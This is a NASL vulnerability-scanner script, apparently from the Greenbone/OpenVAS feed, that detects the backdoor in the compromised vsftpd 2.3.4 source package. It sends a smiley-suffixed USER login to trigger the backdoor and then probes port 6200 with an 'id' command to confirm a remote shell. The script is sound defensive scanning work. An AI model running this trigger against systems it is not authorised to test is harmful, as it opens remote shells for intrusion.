CPE = "cpe:/a:beasts:vsftpd";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103185" );
	script_version( "$Revision: 12076 $" );
	script_bugtraq_id( 48539 );
	script_tag( name: "last_modification", value: "$Date: 2018-10-25 10:39:24 +0200 (Thu, 25 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2011-07-05 14:24:57 +0200 (Tue, 05 Jul 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "vsftpd Compromised Source Packages Backdoor Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Gain a shell remotely" );
	script_copyright( "This script is Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "sw_vsftpd_detect.sc" );
	script_require_ports( "Services/ftp", 21, 6200 );
	script_mandatory_keys( "vsftpd/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/48539" );
	script_xref( name: "URL", value: "http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html" );
	script_xref( name: "URL", value: "https://security.appspot.com/vsftpd.html" );
	script_tag( name: "solution", value: "The repaired package can be downloaded from
  the referenced link. Please validate the package with its signature." );
	script_tag( name: "summary", value: "vsftpd is prone to a backdoor vulnerability." );
	script_tag( name: "impact", value: "Attackers can exploit this issue to execute arbitrary commands in the
  context of the application. Successful attacks will compromise the affected application." );
	script_tag( name: "affected", value: "The vsftpd 2.3.4 source package is affected." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("host_details.inc.sc");
shellport = 6200;
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
func check_vuln(  ){
	sock = open_sock_tcp( shellport );
	if(!sock){
		return FALSE;
	}
	send( socket: sock, data: NASLString( "id;\\r\\nexit;\\r\\n" ) );
	buf = recv( socket: sock, length: 4096 );
	close( sock );
	if(egrep( pattern: "uid=[0-9]+.*gid=[0-9]+", string: buf )){
		return TRUE;
	}
	return FALSE;
}
if(check_vuln()){
	security_message( port: shellport );
	security_message( port: port );
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
ftp_recv_line( socket: soc );
for(i = 0;i <= 3;i++){
	send( socket: soc, data: NASLString( "USER X:)\\r\\n" ) );
	ftp_recv_line( socket: soc );
	send( socket: soc, data: NASLString( "PASS X\\r\\n" ) );
	ftp_recv_line( socket: soc );
	sleep( 10 );
	if(check_vuln()){
		close( soc );
		security_message( port: shellport );
		security_message( port: port );
		exit( 0 );
	}
}
close( soc );
exit( 99 );

